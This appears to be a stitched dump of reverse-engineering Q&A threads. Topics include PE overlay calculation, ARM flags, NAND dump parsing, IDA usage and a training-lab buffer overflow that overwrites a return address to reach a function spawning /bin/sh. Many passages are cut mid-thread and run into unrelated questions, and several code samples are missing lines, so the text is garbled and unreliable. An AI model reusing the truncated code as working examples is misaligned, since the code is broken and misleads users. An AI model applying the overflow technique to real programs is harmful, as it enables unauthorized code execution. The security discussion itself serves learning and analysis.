                long virtSize = section.get(VIRTUAL_SIZE);
                //see https://code.google.com/p/corkami/wiki/PE#section_table: ""if bigger than virtual size, then virtual size is taken. ""
                //and: ""a section can have a null VirtualSize: in this case, only the SizeOfRawData is taken into consideration. ""
                if(virtSize != 0 &amp;&amp; sizeOfRaw &gt; virtSize) { 
                    sizeOfRaw = virtSize;
                }
                long endPoint = pointerToRaw + sizeOfRaw;
                if (offset &lt; endPoint) {
                    offset = endPoint;
                }
            }
        }
        if(offset &gt; file.length()) {
            offset = file.length();
        }
        return offset;
    }
</code></pre>

<p>I used <a href=""https://code.google.com/p/corkami/wiki/PE#section_table"" rel=""noreferrer"">corkami</a> as a source to get to know some of the odds in calculating the overlay offset. I do not only want it to be robust, but also accurate.
Did I miss something? What else do I have to put into consideration?</p>

<p>Note: There was a similar question here: <a href=""https://reverseengineering.stackexchange.com/questions/2014/how-can-one-extract-the-appended-data-of-a-portable-executable"">How can one extract the appended data of a Portable Executable?</a>
But it doesn't cover a reliable algorithm so far. As I understand it, using a tool suffices in that question.</p>
","<p>You appear to be missing the corner cases such as mis-aligned pointers (should round down) and sizes (should round up).</p>

<p>However, even the rounding has corner cases - the physical pointer should be rounded down to a multiple of 512, regardless of the value in the header, but the read size is rounded up by using a combination of the file alignment and 4kb.  The virtual size is always rounded up to a multiple of 4kb, regardless of the value in the header.</p>

<p>Digital signatures must be overlays.  This is a check that is enforced now by Windows, for security reasons.  If not an overlay, the file won't load.</p>

<p>You need something like this (and filealign comes from the PE header):</p>

<pre><code>        long pointerToRaw = section.get(POINTER_TO_RAW_DATA);
        long alignedpointerToRaw = pointerToRaw &amp; ~0x1ff;
        long sizeOfRaw = section.get(SIZE_OF_RAW_DATA);
        long readsize = ((pointerToRaw + sizeOfRaw) + filealign - 1) &amp; ~(filealign - 1)) - alignedpointerToRaw;
        readsize = min(readsize, (sizeOfRaw + 0xfff) &amp; ~0xfff);
        long virtsize = section.get(VIRTUAL_SIZE);

        if (virtsize)
        {
            readsize = min(readsize, (virtsize + 0xfff) &amp; ~0xfff);
        }
</code></pre>

<p>Then you have ""alignedpointerToRaw"" as the starting position, and ""readsize"" as the number of bytes in the section.  Sum these to find the end of the section.  You need to perform this calculation for all sections (because physical data might not be sequential in the file).  The largest sum is the end of the image.  Anything beyond that is overlay.</p>

"Semantics of the RRX shift instruction in ARM and Carry flag updates?","999","","<p>Still looking at ARM assembler semantics (and, I try hard to read the specification, I ensure you!!!). I have some doubts about the ARM bit-shift instructions in general and <code>RRX</code> in particular.</p>

<p>Lets start with <code>RRX</code>. </p>

<p>From <a href=""http://www.davespace.co.uk/arm/introduction-to-arm/barrel-shifter.html"" rel=""nofollow noreferrer"">Davespace, Introduction to ARM, section <em>Barrel Shifter</em></a>, we see that <code>RRX</code> correspond to:</p>

<p><img src=""https://i.stack.imgur.com/Fcyhv.png"" alt=""RRX: Barrel RollRotate Right Extended""></p>

<p>I suppose the <code>C</code> to be the carry flag found in the CPSR, is it correct ?</p>

<p>Second question, in the case of the following instruction:</p>

<pre><code>ands   r9, r0, r0, ror #3
</code></pre>

<p>I read that the carry flag (<code>C</code>) is set to the value of the last bit shifted out by the shifter operand (here <code>ROR</code>). </p>

<p>My problem is that the <code>ands</code> is also supposed to update the CPSR because of its flag <code>s</code>. So, who is winning at the end ? And, what is left in the final carry flag ? The value resulting of <code>AND</code> or the value resulting of <code>ROR</code> ?</p>
","<ol>
<li><p>Yes, <code>C</code> is the carry flag.</p></li>
<li><p><code>C</code> is set from the result of the <code>ROR</code> operation. </p></li>
</ol>

<p>Pseudocode of the <code>AND (register)</code> instruction from the <a href=""http://infocenter.arm.com/help/topic/com.arm.doc.ddi0406c/index.html"" rel=""nofollow"">ARM ARM</a>:</p>

<pre><code>if ConditionPassed() then
    EncodingSpecificOperations();
    (shifted, carry) = Shift_C(R[m], shift_t, shift_n, APSR.C);
    result = R[n] AND shifted;
    if d == 15 then // Can only occur for ARM encoding
        ALUWritePC(result); // setflags is always FALSE here
    else
        R[d] = result;
        if setflags then
            APSR.N = result&lt;31&gt;;
            APSR.Z = IsZeroBit(result);
            APSR.C = carry;
            // APSR.V unchanged
</code></pre>

<p>As you can see, <code>APSR.C</code> is set to the result of the shift operation, not the <code>AND</code> operation.</p>

<p>Now, <code>AND</code> is pretty straightforward but in case of e.g. <code>ADD</code> you may have carry affected by both the shift and the add. So what happens? Again, ARM ARM to the rescue:</p>

<pre><code>if ConditionPassed() then
    EncodingSpecificOperations();
    shift_n = UInt(R[s]&lt;7:0&gt;);
    shifted = Shift(R[m], shift_t, shift_n, APSR.C);
    (result, carry, overflow) = AddWithCarry(R[n], shifted, APSR.C);
    R[d] = result;
    if setflags then
        APSR.N = result&lt;31&gt;;
        APSR.Z = IsZeroBit(result);
        APSR.C = carry;
        APSR.V = overflow;
</code></pre>

<p>The answer: the add ""wins"" and the carry of the shift operation is discarded.</p>

<p>BTW, a good page to check what happens for each concrete instruction is <a href=""http://svr-acjf3-armie.cl.cam.ac.uk/main.cgi"" rel=""nofollow"">here</a>. For example:</p>

<pre><code>ands r9, r0, r0, ror #3
machine code: E01091E0
...
cpsr.N  ←   (r0 AND r0 ROR 3)&lt;31&gt;
cpsr.Z  ←   r0 AND r0 ROR 3 = 0
cpsr.C  ←   #CARRY (ROR_C (r0,3))
r9  ←   r0 AND r0 ROR 3
r15 ←   r15 + 4


adds r9, r0, r0, ror #3
machine code: E09091E0
...
cpsr.N  ←   (r0 + r0 ROR 3)&lt;31&gt;
cpsr.Z  ←   r0 + r0 ROR 3 = 0
cpsr.C  ←   #CARRY (AddWithCarry (r0,r0 ROR 3,False))
cpsr.V  ←   #OVERFLOW (AddWithCarry (r0,r0 ROR 3,False))
r9  ←   r0 + r0 ROR 3

These tools allow a very easy interface for changing the programs look and feel.
Replacing icons, text, menus can be easily done without any knowledge in reversing.</p>

<p>My question is, what option I have to prevent the resources being so easily edited ?</p>
","<p>Resources are just a standard structure with defined constants, but in the end, it's just a recursive structure to a buffer, no matter what it contains (<a href=""http://www.slideshare.net/ange4771/ange-albertini-hashdays2012extended/56"">here is the standard layout</a>).</p>

<p>It can theoretically contain anything - any depth, loops, invalid types, etc... but then standard APIs will not work with them.</p>

<p>So, you need to make sure that, if you encrypt or compress resources, they need to be restored (both the resource directory structure, and their content) before any of these APIs is used, which might not be obvious.</p>

<p>In particular, some resources will be used by the OS even before the file is executed, such as first icons, manifest and version information - so you probably want to keep these intact.</p>

<p>A simple way to prevent trivial resource editing would be to run a stream cipher on selected resources, on the final binary (after the linker put them in place and generated the resource entry in the DataDirectory), and to restore these resources on demand or on program initialization.</p>

<p>If you're looking for a ready-made solution, many good packers such as <a href=""http://bitsum.com/pecompact.php"">PECompact</a> support resource compression, thus preventing external resource editing.</p>

"Understanding this Buffer Overflow exploitation","984","","<p>some days ago I took this piece of code from opensecuritytraining.info to test a buffer overflow exploitation:</p>

    char *cmd[] = { ""/bin/sh"", 0 };

int authorize(){
    char password[64];

        go_shell();
    } else{
        printf(""Acceso denegado\n"");
    }
    return 0;
}
</code></pre>

<p>The first test before injecting a shellcode was trying to execute the go_shell function without knowing the password, overflowing the return address of main function and pointing it to the location of go_shell.</p>

<p>As far as I understand the stack is divided as below:</p>

<pre><code>[STACK] {Return_address}{EBP}{password_buffer(64)}...
</code></pre>

<p>So If I store in password_buffer 68 bytes plus the address of go_shell it should overwrite the return address and execute the desired function.</p>

<pre><code>[STACK] {4bytes (Location of go_shell)}{EBP(4 Bytes of junk)}{password_buffer(64)(64 bytes of junk)}...
</code></pre>

<p>The problem here is that I need to fill the buffer with 76 bytes of junk plus 4 bytes of the address to actually override the return address and point %eip to go_shell. What I don't understand is where do those additional 8 bytes come from?</p>

<p>This is the GDB output before injecting 74 A (0x41) + the address in a breakpont at line if (!strcmp(password,secret)):</p>

<pre><code>EBP:
0xbffff4a8: 0x41414141  0x0804851c

AAAA + memory_address

<p>And continuing to go_shell execution (Breakpoint at void go_shell(){ ):</p>

<p>EIP now points to the last return address overwrited:</p>

<pre><code>(gdb) x/2x $eip
0x804851c &lt;go_shell&gt;:   0x83e58955  0x45c728ec
</code></pre>

<p>Any help understanding this?</p>

<p>Regards.</p>
","<p>If you look at the disassembly of authorize() I'm sure you'll find that the compiler is pushing and restoring more registers than just EBP or aligning the stack. I would recommend that you always look at the disassemly when dealing with overflows of various kinds. The compiler and decompiler, if you use one, hides a lot of details. The disassembly never lies and allows you to make a prediction without resorting to dynamic analysis. I'm a strong proponent of learning with static methods when you're just starting out.</p>

<p>Anyways, whether there's more registers, a stack canary, stack alignment or something else, the disassembly of authorize() will reveal the answer to your question.</p>

movzx   eax, al

</pre> 

<p>You'll notice that it doesn't use push to move arguments, ebp is unused as a stack frame and the compiler aligns the stack since sum of stack changes is 0x60; return value misaligns by 4, push ebx by 4 more, then sub esp, 0x58 results in 0x60.</p>

<p>If we were to view this in hex mode in this example we would see ""<code>CC CC ..</code>"". With other compilers we might see ""<code>90 90 ..</code>"". The obvious hint of what this is being used for is the ""align"" keyword. </p>

<p><strong>Question:</strong> how can I tell if a specific byte at an address is marked as <code>align</code> in IDAPython? Example code would be appreciated. </p>

<p>I have found a couple of functions and data types such as <code>FF_ALIGN</code> and <code>idaapi.is_align_insn(ea</code> that looked positive but I have yet to figure out a working example or results that confirm yes or no. I would prefer to rely on IDA types or functions rather than use string parsing for the keyword ""align"". </p>
","<p>Answering my own question so it's not marked as being opened. @DCoder's comment of using <code>isAlign(idaapi.getFlags(ScreenEA()))</code> is correct. </p>

<p>If we execute the following command. </p>

<pre><code>Python&gt;isAlign(idaapi.getFlags(0x0040117C))
True

<p>We would get a value of True. Note: This only works for the first byte that is marked as align. All further align bytes will return false. Thanks DCoder for the answer. </p>

"How to decompile this assembly code?","975","","<p>How can I convert the following IDA Pro generated disassembly (assembly language) into a higher level language?</p>

<pre><code>...
mov edx, Var1
mov ecx, Var2
mov eax, edx
imul ecx
mov edx, eax
imul edx, eax
mov Var3, ecx
...
</code></pre>

<p>I am trying to write a detailed pseudo code describing the function of the provided assembly snippet.</p>
","<p>Please note that there is no general 1:1 relation between assembly code and a higher level language, especially if the assembly was crafted manually. And even for compiled code there may be no good translation if the code was heavily optimized.</p>

<p>Also, note that reverse engineering is not about translating assembly to higher level language, it's about figuring out what's going on. For example, a year ago, someone asked this series of questions [<a href=""https://reverseengineering.stackexchange.com/questions/6858/create-key-generator-algorithm-from-validation-algo"">1</a>] [<a href=""https://reverseengineering.stackexchange.com/questions/6945/identify-a-decryption-scheme"">2</a>] [<a href=""https://reverseengineering.stackexchange.com/questions/8311/reverse-decryption-algorithm"">3</a>]. That guy meticuously translated a lot of assembly to C and wasn't any wiser; in the end, he could have saved himself 2 months if he had been able to recognize the RSA algorithm from the code.</p>

<p>Of course, a high level language implementation of something might be easier to read than assembly, so translating to high level might be <em>a part</em> of the work, but it's not the biggest part in most cases.</p>

<p>That said, as you have only 2 opcodes, one of which is <code>mov</code> which is the equivalent to an assignment:</p>

<pre><code>mov edx, Var1           ; edx=Var1
mov ecx, Var2           ; ecx=Var2
mov eax, edx            ; eax=edx (=Var1)
imul ecx                ; eax=eax*ecx (=Var1*Var2)
mov edx, eax            ; edx=eax (=Var1*Var2)
imul edx, eax           ; edx=edx*eax (=(Var1*Var2)^2)
mov Var3, ecx           ; var3=ecx (=Var2)
</code></pre>

<p>So, your code calculates (Var1*Var2)^2, but then assigns Var2 to Var3, not the calculated result. </p>

<p>If this was a homework question, i'd assume your teacher wanted to see if you're paying attention to detail. Also, it shows that there's no good translation to a high level language, because you don't generally calculate anything in them without using the result. Although, in C, you could have written</p>

<pre><code>(Var1*Var2)*(Var1*Var2);    // note the expression without an assignment
Var3=Var2;
</code></pre>

<p>but your compiler would normally throw away the first line of this.</p>

<p>However, I have this pseudo-code from this function generated by IDA Pro:</p>

{
  __int64 result; // qax@1
  unsigned __int64 v2; // ST00_8@1
  struct _FILETIME SystemTimeAsFileTime; // [sp+0h] [bp-8h]@1

  GetSystemTimeAsFileTime(&amp;SystemTimeAsFileTime);
  HIDWORD(v2) = ((_DWORD)SystemTimeAsFileTime.dwLowDateTime &gt;= 0xD53E8000u)
              + SystemTimeAsFileTime.dwHighDateTime
              - 27111903;
  LODWORD(v2) = SystemTimeAsFileTime.dwLowDateTime + 717324288;
  result = sub_5D0500(v2, (unsigned int)&amp;unk_989680, 0);
  if ( a1 )
    *(_DWORD *)a1 = result;
  return result;
}
</code></pre>

<p>One problems is that code won't compile, this code doesn't make sense:</p>

<pre><code>HIDWORD(v2) = ((_DWORD)SystemTimeAsFileTime.dwLowDateTime &gt;= 0xD53E8000u)
              + SystemTimeAsFileTime.dwHighDateTime
              - 27111903;
</code></pre>

<p>Also one problem is the <code>ADC</code> command which all I can find is that it is exactly as <code>ADD</code> but it also adds the <code>CARRY FLAG</code> to the result, but I can't find any ways to reproduce this command in C#.
And what about all those <code>HIDWORD</code> and <code>LODWORD</code> macros?</p>
","<p>This is 64-bit math. The compiler has to do the addition in two steps because the processor can only work 32 bits at a time. And carry has to be propagated from the low addition to the high one - same way when you do addition of multiple-digit numbers on paper.</p>

<p>Here's what the current version of the decompiler (1.7) produces (after fixing the function prototype):</p>

<pre><code>result = sub5D0500(time - 116444736000000000i64, 10000000i64);
</code></pre>

<p>And (just a guess) if you rename <code>sub5D0500</code> to <code>__alldiv</code> (compiler helper function for 64-bit division), it becomes:</p>

<pre><code>result = (time - 116444736000000000i64) / 10000000;
</code></pre>

<p>Apparently you're looking at MSVC's <code>_time64</code> implementation. From <code>time64.c</code>:</p>

<pre><code>/*

"Using a VMM/hypervisor to monitor guest OS execution?","974","","<p>I would like to set up a virtual machine monitor using Microsoft Hyper-V, VMware vSphere/ESX, Xen, or any other alternative hypervisor solution that is able to monitor the execution of a guest OS (a VM within the VMM). </p>

<p>In particular, I'd like to be able to view the guest OS' instructions before they are run by the virtual CPU. Additionally, I'd also like to be able to set monitors on some of the guest OS' CPU registers so if they are modified (e.g. on write with a MOV instruction), the guest's state will be suspended at the location where the write occurred (and the rip/eip will point to that instruction).</p>

<p>I've been searching for a VMM solution that exposes a way to accomplish my goals, but I couldn't find anything.</p>

<p>Does anyone know what the best way of approaching such a thing is? Any recommendations on the hypervisor that I should be using? (I'm guessing that Xen would probably be easiest to modify and debug since it's open source)</p>

<p>Thanks a lot.</p>

<p>Cheers,</p>

<hr>

<p><strong>EDIT:</strong> I'll try to explain myself better. I'm attempting to debug code running in kernel-mode (x86-64). Right now, I'm using WinDbg to debug the ring0 code in a virtual machine (VMware). </p>

<p>If I could, I would be more than happy in setting a hardware breakpoint (ba) on a memory location and seeing what reads/writes to it. The problem is that my hardware breakpoints are being disabled by the code running in ring0. Basically, this code is saving the contents of the dr7 register off, clearing it, accessing the memory that I'm watching (the memory I set the hardware breakpoint on), and finally is restoring the dr7 register after access. Thus, my hardware breakpoint is never hit. This means I never figure out where the memory was being manipulated from. Suffice it to say that software breakpoints are not an acceptable alternative. Additionally, I've also tried mucking around with the general-detect bit in dr7 and installed my own trap handler to understand if someone's screwing with my hardware breakpoints. However, this code is quite smart and handles this attempt nicely (re: restores the old hook before accessing any of the debug registers).</p>

<p>I hope you now see my conundrum. I need to be running at a lower level than ring0 to deal with this code running at ring0. The only way to do that is in a hypervisor. </p>

<p>I would like to monitor the contents of say the dr7 register and see what's accessing it (read/writes). If I find the RIP of the faulting code, I'll be able to step through it and understand more of what it's doing.</p>

"Extracting a NAND flash dump with OOB data","970","","<p>I'm trying to extract a NAND flash dump of an old Walkman player. The dump was done by a friend and unfortunately cannot be redone because the chip was destroyed.
The dump was supposed to be just user data without OOB but it seems something went wrong and OOB is still there. 
I tried various ways of removing OOB and I can get some reasonably-looking data but many things are still off and I can't extract proper files.</p>

<p>Here's what I tried.</p>

<p>Just by looking visually into hex dump, there are a 16-byte lines beginning with ""01 00 00 00"" 
every 0x200 bytes which look out of place. 
<a href=""https://i.stack.imgur.com/u4YMX.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/u4YMX.png"" alt=""hex dump""></a>
I made a short script to remove 16 bytes after every 0x200:</p>

<pre><code>import sys
inf = open(sys.argv[1] ,""rb"")
of = open(sys.argv[2],""wb"")
clen = 0x200
c = inf.read(clen)
off = 0
while c:
  off = inf.tell()
  oob = inf.read(0x10)
  if oob[:4]!=""\x01\x00\x00\x00"":
   print "" bad OOB at %08X?"" % off, oob.encode('hex')
   break
  of.write(c)
  if (off&amp;0x1000) ==0:
   print ""%08X"" % off
  c = inf.read(clen)


inf.close()
of.close()
print ""done.""
</code></pre>

<p>The added sanity check triggers pretty quickly:</p>

<pre><code>00000200
00000410
00000620
00000830
00000A40
00000C50
00000E60
 bad OOB at 00001070? 042080e4fbffffea10009fe530ff2fe1
done.
</code></pre>

<p>And indeed, the next line starting with 01 00 00 00 is at 1240, not 1070. I tried to account for it and restart, but 
I ran into similar issues later. So I wonder if I'm missing something. 
The full file is 4GB which is a bit heavy so here are few cut out chunks:</p>

<ol>
<li>beginning of the dump (initial bootloader?). <a href=""http://filebin.ca/3GSGqkvCosrS/chunk0.bin"" rel=""nofollow noreferrer"">offset 0</a></li>

<p>if you'd like to see the whole dump I've shared a link in <a href=""http://chat.stackexchange.com/transcript/message/36175953#36175953"">our chat</a>.</p>

<p>Hardware details:
Device is Sony Walkman NWZ-A829. 
The flash chip is most likely TH58NVG6D1DTG20. 
The CPU is a NEC MP201 (ARMv5le).</p>

<p>The final goal is to figure out the firmware update encryption and produce custom firmware for the device.</p>
","<p>So, I have figured it out myself in the end. I'll try to describe the process.</p>

<p>First, a bit of background on NAND: it is organized in pages which are grouped into blocks. You can read or write a single page at a time but erasing (which turns all bits to 1s (so bytes to FFs)) can be only done one block at a time (writing can only change bits from 1 to 0 but not the other way around, so to write new data the block usually has to be erased first). Usually the chip also has some extra storage per page to store ECC (error-correction code) and/or arbitrary ""spare"" data (also called OOB: out-of-band) which is not considered to be part of the useful storage of the chip but can still be read and written using low-level functions.</p>

<p>While browsing the hex dump, I came across this region after a bunch of FFs:</p>

</code></pre>

<p>(from <code>icx1087_nand.c</code>)
So, apparently these blocks are related to ""Loader Management""... looking at the references we come across this code chunk:</p>

<pre><code>/* read management table */
for( rty = 0; rty &lt; NAND_READ_RETRY; rty++ ) {
    if( nand_search_tbl(NAND_BLK_LOADER_START, NAND_BLK_LOADER_LMT,
                        MNG_SIG_LOADER, TBL_SIG_PART, (void *)&amp;ptbl, 0) ) {
            continue;
    }
    /* success to read Kernel information if reach here */
    break;
}
</code></pre>

<p>So, it's looking for <code>MNG_SIG_LOADER</code> (lOAd) in the NAND block NAND_BLK_LOADER_START. And the value is...</p>

<pre><code>#define NAND_BLK_LOADER_START   1
</code></pre>

<p>So looks like 82000 is the start of NAND block 1. If we check the code further, we can see that it's looking for other signatures (e.g. <code>TBL_SIG_PART</code> or <code>TBL_SIG_FUKRNL</code>) in <em>pages</em> of this block. And let's see:</p>

<ul>
<li><p>MNG_SIG_LOADER: 82000 (block 1 page 0?)</p></li>
<li><p>TBL_SIG_PART: 83040 (block 1 page 1?)</p></li>
<li><p>TBL_SIG_UBOOT: 84080 (block 1 page 2?)</p></li>
</ul>

<p>83040-82000=1040  and 84080-83040=1040 too! So looks like the page size in the dump is 1040. and 1040*128 =82000 which means we have 128 pages per block. The actual data is probably 0x1000 bytes and 0x40 is the ""spare"" data. So, this explains why I had desynchronization after each four 0x200 sectors: there are 8 sectors per page but only 0x40 bytes of OOB data.</p>

<p>I'm not sure why the dump ended up having such weird structure; I think it's because the software used for dumping (IIRC it was <a href=""https://github.com/ohjeongwook/DumpFlash"" rel=""noreferrer"">DumpFlash</a> by Matt Oh) assumes 512-byte pages in many places and somehow the OOB data ended up being spread in chunks instead of being grouped at the end of each page. Possibly it's also related to this passage in <a href=""https://toshiba.semicon-storage.com/ap-en/product/memory/nand-flash/detail.TC58NVG0S3HTA00.html"" rel=""noreferrer"">the datasheet</a> for a similar (but not same) Toshiba chip:</p>

<blockquote>
  <p>8 bit ECC for each 512Byte is required</p>
</blockquote>

<p>(but no explanation on how it should be done)</p>

<p>In any case, once I figured out the magic numbers of 0x1040 for page size and 128 pages per block, it was not difficult to fix my script:</p>

<pre><code>NAND_PAGE_SIZE  = 0x1000
NAND_PAGE_BLK   = 128
NAND_SECTOR_PER_PAGE = 8
NAND_SECTOR_SIZE = NAND_PAGE_SIZE/NAND_SECTOR_PER_PAGE
OOBLEN = 16

def page2off(pgno):
  return pgno*0x1040 # (NAND_PAGE_SIZE + NAND_SECTOR_PER_PAGE*OOBLEN)

def read_page(inf, blkno, pgno):
 blklen = page2off(NAND_PAGE_BLK)
 fileoff = blklen*blkno + page2off(pgno)
 print ""reading block %d page %d: offset %08X"" % (blkno, pgno, fileoff)
 inf.seek(fileoff, 0)
 block = inf.read(blklen)
 s = """"
 soff =0
 for i  in range(NAND_SECTOR_PER_PAGE):
  print ""sector %d offset %08X"" % (i, soff)
  s+= block[soff:soff+NAND_SECTOR_SIZE]
  soff += NAND_SECTOR_SIZE+OOBLEN
 return s
</code></pre>

<p>With this I could dump parts of the flash with the kernel and ramdisk and extract the binaries.</p>

More about my need:
<br>
I want to find library functions in PE files (on my own program not by IDA) and ,as there are a huge amount of FLAIR pattern for all libraries , I cannot load them altogether because of memory and speed issues .<br>
I have also read pat.txt in IDA FLAIR and i know the patterns format but startup signatures format is a bit different and has new parts so I want to know about these new parts like :
<code>
 o=2:a=108:vc32rtf:l=vc32mfc/vcextra/vc8atl:m=+67^[_DllMain@12]~msmfc2d/~@vc32mfc@;
</code></p>
","<p>First, you should begin by reading through pat.txt which is included with the IDA flair utilities. It describes the format of .pat files. </p>

<p>Second it would be helpful if you can clarify what you are trying to do. What processor/file type are you working with? In many cases you do not need to directly manipulate .pat files at all since Hex-Rays provides tools to generate .pat files and .sig files from those .pat files. </p>

<p>Third, it is not clear exactly what type of signatures you are trying to work with and why. IDA ""startup"" signatures are a special form of signature used the when you first create a database for a new binary file. The purpose of startup signatures is to identify startup routines and the compiler used to create the binary. This may in turn trigger the loading of additional library signature files. Library signature files are the ones used to recognize the presence of library code that has been statically linked into a binary. Signatures are usually generated by parsing a copy of the static link libraries that were linked into the binary you are interested in. The most common case for needing to understand the .pat file format is when the parsers that Hex-Rays ships with flair are not capable of parsing the link libraries that you are trying to create patterns from.</p>

<p>To see the first 3 chunks of the file in their entirety, see <a href=""http://pastebin.com/RTFkdiBd"" rel=""nofollow noreferrer"">http://pastebin.com/RTFkdiBd</a></p>

<h2>Current knowledge</h2>

<p>Each DTS file is broken into chunks. The 10th - 13th bytes are a start-of-chunk marker; I think this is <code>03 00 1E 00</code> in each file. The next four bytes are the size of the chunk, always followed by FF 00. A new chunk will begin immediately after the previous ends. I don't know how the chunks divvy up data right now, but it does appear that multiple chunks contain vertices. This may be related to the fact that the model is noticeably divided into discrete parts, rather than a single mesh.</p>

<p>Each vertex is a set of 6 bytes, consisting of 3 <em>signed</em> shorts for the X, Y, and Z coordinates of that vertex. The first vertex in this file is 24 FF 62 01 82 05, which has coordinates -220, 354, 1401 when converted to decimal. The sample I've provided contains the following vertices:</p>

<pre><code>24 FF 72 01 82 05 
DC 00 72 01 82 05 
DC 00 C0 FE 8C 05 
24 FF C0 FE 8C 05
24 FF E8 FE 00 05
24 FF 04 01 60 04
DC 00 04 01 60 04 
DC 00 E8 FE 00 05
</code></pre>

<p>These vertices define the crotch. Interestingly, the crotch is actually located above the head in 3D space as defined in the file, so it must get translated somewhere. I have tested and verified that the above bytes contain the crotch by editing them in RAM while the game is running, which distorts the model immediately when I click back into the game window. </p>

<p>Notice that between some of these vertices are two sets of six bytes that do not appear to be vertices (they don't correspond to any point on the model and have no effect when altered in RAM). I don't know what the deal with these is:</p>

<pre><code>00 F8 00 00 00 00
00 08 00 00 00 00
</code></pre>

<p>The rest of the model is defined in pieces throughout the file. Vertices are clustered into small groups, which I think define one shape at a time. I can find vertices for everything but the weapons and legs. The legs are animated, so they might be defined differently, or located in a different file. The weapons are defined in a separate file.</p>

<p>Preceding the vertices are some shorts with small values, e.g. 06 00 02 00. These have something to do with the faces; my guess is that they refer to vertices by index to define a face. I have verified that these affect the faces by editing them in RAM while the game is running, but haven't fully decoded them yet.</p>

<p>There is always 6 bytes of 0s (<code>00 00 00 00 00 00</code>) between the faces and the vertices. There is always the marker <strong><code>04 00 00 00 14 00 00 00 14 00 00 00</code></strong> shortly after the vertices end. Using this knowledge, I'm able to parse vertices from a file by looking between those two markers; however, this is imprecise and I end up with a bunch of junk vertices forming a partial spherical shell around the model.</p>

<p>Here is a rendering of a point cloud of vertices I am able to read out of the Apocalypse DTS file; I have filtered out some of the junk vertices here, but there are still some present around the edges and in the middle. Take note that the hips and crotch are located <em>above</em> the torso in the file.

<h2>What's next?</h2>

<p>I'm not hoping to decode the entire DTS file from start to finish - it's much too long and complex - but I'd like to at least be able to read the vertices, and hopefully faces, out of the files. </p>

<p>The biggest struggle I've been having at the moment is trying to figure out how to know exactly where a set of faces/vertices start and end. <strong>My main question would be how to <em>precisely</em> determine where a group of faces/vertices start and end</strong>, as they are not in the exact same place in every file. Any other information you can spot that I've missed would be awesome, but that's my main objective. </p>
","<p>To determine where the faces/vertices are laid out purely via inspection can be pretty time consuming and hit-and-miss. Given the executable is available that processes these files, I think it's probably a better starting point - it definitively knows how to process the format.</p>

<p>I used IDA Pro to analyse the code in the executable that's involved in loading the data, using the some magic numbers [including the 0x001e0003 you noted as the ChunkMarker] to locate the relevant parts and expanding from there.</p>

<p>You'll find that there are some duplications of surfaces in the mesh - I think the base mesh is just solid-shaded, but uses textures sparingly like decals over the base mesh.</p>

<p>Here's an example imported into Blender.

","<p>Okay, Windows XP, OpenWatcom. I am using OpenWatcom 1.9. When trying to reproduce your problem, I used <code>calc.exe</code> from Windows XP for which there are no Watcom debug symbols available (only the PDB format from Microsoft, which Watcom doesn't support <em>at all</em>).</p>

<p>When dismissing the open dialog from your first step, we get the assembly view like this. I am returning from that call (<code>Run -&gt; Until Return</code>) a few times and realize that the call stack shows I am still in the loader phase.</p>

<p><img src=""https://i.stack.imgur.com/LjloV.png"" alt=""enter image description here""></p>

<p>The most logical thing to do now would be to break at either <code>kernel32!BaseThreadInitThunk</code> which is basically <em>the</em> entry point for any Win32 thread, including the very first in a process, but isn't exported (and, remember, we have no symbols). For a writeup on the startup process, see <a href=""http://abdelrahmanogail.wordpress.com/2010/11/05/thread-basics/"" rel=""nofollow noreferrer"">here</a> or the ""Windows Internals"" book. The next possible candidate would be <code>ntdll!RtlUserThreadStart</code> which also isn't exported and therefore unavailable.</p>

<p>So, assuming you really have no modern debugger (WinDbg, cdb, let alone IDA, Hopper and friends) available, and don't want to use <a href=""http://live.sysinternals.com/livekd.exe"" rel=""nofollow noreferrer""><code>livekd.exe</code> from SysInternals</a> (which however requires a recent <code>dbghelp.dll</code>) the only method that seems to be reasonable is to load your target executable into an editor (<a href=""http://www.ntcore.com/exsuite.php"" rel=""nofollow noreferrer"">CFF Explorer comes to mind</a>) and put an <code>int3</code> (<code>cc</code>) instruction at the entry point or simply move the entry point elsewhere. In my case I chose to overwrite the <code>push 70h</code> (<code>6A 70</code>) with <code>int3; nop</code> (<code>CC 90</code>). That enabled me to break at the beginning of the program (not considering TLS callbacks or anything like that, though).</p>

<p>Another less intrusive method is to use the above mentioned CFF Explorer or really any suitable tool to give you the VA of the entry point. Since we're talking about Windows XP we need not worry about ASLR or anything like that. </p>

<p><img src=""https://i.stack.imgur.com/Z8YPK.png"" alt=""enter image description here""></p>

<p>The entry point in our case is at RVA <code>0x12475</code>, which the Address Converter translates to:</p>

<p><img src=""https://i.stack.imgur.com/Henkx.png"" alt=""enter image description here""></p>

<p>VA <code>0x1012475</code>. Sweet. Now we can try to let OpenWatcom stop at this address. Setting a bpx at this address (<code>Break -&gt; View All -&gt; Rightclick -&gt; New</code>, enter address) and then pressing <kbd>F5</kbd> (for ""Go"") to skip the startup phase for the process gets us straight to the entry point.</p>

<p><img src=""https://i.stack.imgur.com/ZFfzH.png"" alt=""enter image description here""></p>

<p>From there we can use <kbd>F8</kbd> for further single-stepping. And I'm sure similar to the experience we shared during the startup phase, any little thing that changed since the debugger was last adjusted to a more recent OS will trip you (or rather the OW debugger) up. Short of switching debuggers, you might want to make heavy use of <code>Break -&gt; On Debug Message</code>, but even that seemed of little use when I tried it.</p>

<h1>Conclusion</h1>

<p>It's possible, but heck it's tedious and it may fall short of your needs at any point.</p>

<p>Quite frankly, some debuggers are better left alone when no source is available (assembly debugging). Admittedly I am not as familiar with the Watcom debugger as with GDB or WinDbg, but I've used it in the past and found it pure horror <em>with</em> symbols. That impression will likely only get worse <em>without</em> symbols. I find myself confirmed in that sense from looking into the issue you were experiencing.</p>

<h2>20th century debugging</h2>

<p>OpenWatcom, while still being ""developed"" is old. Its roots are in the old Sybase product Watcom, which had a broad following. Problem is, that this product existed even before Windows 2000. So I don't think you can expect a lot from it, as most people these days are using compilers and debuggers with better support. Be it WinDbg or be it GDB if you happen to use MinGW or something like that.</p>

"What is the Ubicom32 toolchain and where can I find it?","961","","<p>I am currently reversing firmware for some device.
Without any issues I was able to reach deep into its core and extract the file-system. Now I was trying to reverse some of the special applications on this device. After checking the file format I noticed the following: It is an ELF 32-bit MSB (big-endian) on the Ubicom32 platform. </p>

<p>After googling, checking woodmann and tinkering with it a bit I couldn't find too much information about this format expect the fact that ""it exist"".</p>

<p>Are there tools (or plug-ins) that handle this file format? Can I just regard this as ARM or MIPS? I did find <a href=""https://dev.openwrt.org/browser/trunk/target/linux/ubicom32?rev=19815&amp;order=name#files/arch/ubicom32"" rel=""nofollow"">OpenWRT - Ubicom32 Kernel</a> but no toolchain.</p>
